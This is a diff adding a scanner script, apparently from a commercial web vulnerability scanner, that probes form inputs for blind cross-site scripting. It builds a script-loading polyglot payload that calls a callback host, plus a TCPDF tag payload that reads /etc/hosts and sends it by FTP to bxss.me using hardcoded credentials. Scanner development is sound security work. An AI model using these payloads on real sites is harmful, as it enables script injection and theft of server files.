@@ -1,0 +1,105 @@
+#include constants.inc;
+#include helpers.inc;
+var targetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+targetUrl.path = scheme.path;
+targetUrl.getVar = "";
+{ // class for testing for BlindXSS Injection
+	function classBlindXSSInjection(scheme, inputIndex){
+	
+		this.scheme = scheme;
+		this.inputIndex = inputIndex;
+		this.variations = scheme.selectVariationsForInput(inputIndex);
+		this.currentVariation = 0;
+		this.lastJob = null;
+	}
+	
+    /**************************************************************************************************************/
+    classBlindXSSInjection.prototype.getOrigValue = function()
+    {   
+        var value = "";
+        
+        for (var i=0; i<this.variations.count; i++){
+            var varValue = this.scheme.getVariation(this.variations.item(i)).item(this.inputIndex);
+            
+            // if the value is not yet set      
+            if(value == "" && varValue != "") {
+                value = varValue;                       
+                break;
+            }
+        }
+        return value;
+    }	
+    
+	classBlindXSSInjection.prototype.request = function(value)
+	{	
+		this.scheme.loadVariation(this.variations.item(this.currentVariation));
+		
+		// for files manipulate also the input filename and set a valid content-type
+		if (this.scheme.hasFileInput && (this.scheme.getInputFlags(this.inputIndex) & INPUT_FLAG_IS_FILE)){
+			this.scheme.setInputFileName(this.inputIndex, value);
+			this.scheme.setInputContentType(this.inputIndex, "image/png");
+			this.scheme.setInputValue(this.inputIndex, value);
+		}
+		else this.scheme.setInputValue(this.inputIndex, value);
+		this.lastJob = new THTTPJob();
+		this.lastJob.url = targetUrl;
+		scheme.populateRequest(this.lastJob);
+ 
+		this.lastJob.execute();
+		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003))); 
+	}	
+	
+	classBlindXSSInjection.prototype.testInjection = function(value)
+	{
+		if (!this.request(value)) return false;
+		return true;
+	}
+	
+	classBlindXSSInjection.prototype.startTesting = function()
+	{
+        var origValue = this.getOrigValue();
+		for (var i=0; i < this.variations.count; i++)
+		{
+			this.currentVariation = i;
+			// polyglot from Gareth Heyes
+            // </script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/xss.harisec.com?u=1&x=2-1/).slice(2),document.documentElement.appendChild(s))//'>
+            var reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 4);
+            if (reqId) {
+                var reqIdParts = reqId.split("-");
+                var reqScanId = reqIdParts[0];
+                var reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1,6);
+                var up = new TURL(bxss_url);
+                var url = up.host + "\\/s?u=" + bxss_userId + "&r=" + reqId + "&h=" + reqScanId + "-" + reqHash + '-2&';
+                var payload = origValue + '</script><svg/onload=\'+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/' + url + '/).slice(2),document.documentElement.appendChild(s))//\'>';
+                if (!this.testInjection(payload)) continue;
+            }
+            // second test
+            // <script src=http://bxss.me/s?u=1&r=1></script>
+            var reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 1);
+            if (reqId) {
+                var reqIdParts = reqId.split("-");
+                var reqScanId = reqIdParts[0];
+                var reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1,6);
+                var tcpdfPayloadMarker = "bxss," + bxss_userId + "," + reqId + "," + reqScanId + "," + reqHash + ",";
+                var tcpdfPayload = '<tcpdf method="addTTFFont" params="%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2F' + tcpdfPayloadMarker + '%22%5D"/>';
+                var payload = origValue + "'>\"><script src=" + bxss_url + "s?u=" + bxss_userId + "&r=" + reqId + "&h=" + reqScanId + "-" + reqHash + "-1></script>" + tcpdfPayload;
+                if (!this.testInjection(payload)) continue;
+            }
+		}
+	}
+}
+// main entry point 
+var bxss_enabled = getGlobalValue('blindxss.enabled');
+var bxss_userId = getGlobalValue('blindxss.userid');
+var bxss_url = getGlobalValue('blindxss.url');
+// don't run unless blind xss is enabled and have a valid userid and url
+if (bxss_enabled == 1 && bxss_userId && bxss_url) {
+	for (var i=0;i<scheme.inputCount; i++)
+	{
+		var tester = new classBlindXSSInjection(scheme, i);
+		tester.startTesting();
+		ScriptProgress(ComputeProgress(i, scheme.inputCount));
+		tester = null;
+	}
+}
